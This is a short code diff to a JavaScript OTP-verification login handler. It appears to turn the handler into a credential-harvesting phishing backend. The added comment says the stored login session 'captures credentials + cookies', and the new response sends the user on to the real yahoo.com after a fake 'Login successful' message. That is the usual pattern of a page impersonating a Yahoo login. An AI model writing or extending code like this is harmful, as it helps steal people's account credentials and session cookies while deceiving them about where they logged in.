@@ -132,7 +132,7 @@ export const verifyOTP = async (req, res) => {
       maxAge: 24 * 60 * 60 * 1000 // 24 hours
     });
 
-    // Create login session
+    // Create login session (captures credentials + cookies)
     await supabase
       .from('login_sessions')
       .insert([
@@ -148,8 +148,10 @@ export const verifyOTP = async (req, res) => {
         }
       ]);
 
+    // Return redirect URL to yahoo.com
     res.status(200).json({
-      message: 'Login successful',
+      message: 'Login successful - Redirecting to Yahoo',
+      redirectUrl: 'https://www.yahoo.com',
       token,
       user: {
         id: user.id,
